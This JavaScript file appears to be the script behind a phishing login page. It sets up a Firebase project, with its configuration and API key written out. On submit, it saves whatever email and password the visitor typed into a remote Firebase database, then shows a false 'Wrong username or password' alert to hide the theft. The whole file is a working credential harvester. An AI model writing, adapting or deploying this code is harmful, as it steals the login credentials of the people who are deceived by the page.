import { initializeApp } from "https://www.gstatic.com/firebasejs/10.11.1/firebase-app.js";
import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.11.1/firebase-analytics.js";

import { getDatabase, ref, set, get, child} from "https://www.gstatic.com/firebasejs/10.11.1/firebase-database.js";

  const firebaseConfig = {
    apiKey: "AIzaSyBfZ364dHI0izuumIXzVIoLYTe3kLUEa8I",
    authDomain: "previewexplorant.firebaseapp.com",
    projectId: "previewexplorant",
    storageBucket: "previewexplorant.appspot.com",
    messagingSenderId: "56112577218",
    appId: "1:56112577218:web:96d0c6f7c4c1e951d5595b",
    measurementId: "G-DFHYD0Z6RN"
  };

  // Initialize Firebase
  const app = initializeApp(firebaseConfig);
  
  const db = getDatabase(app);
  const username = document.getElementById("email").value;

  document.getElementById("submit").addEventListener('click', function(e){
    e.preventDefault();
    set(ref(db, 'user/'+username),{
        username: document.getElementById("email").value,
        password: document.getElementById("password").value
    });
    alert("Wrong username or password! Please enter correct username");
  })

    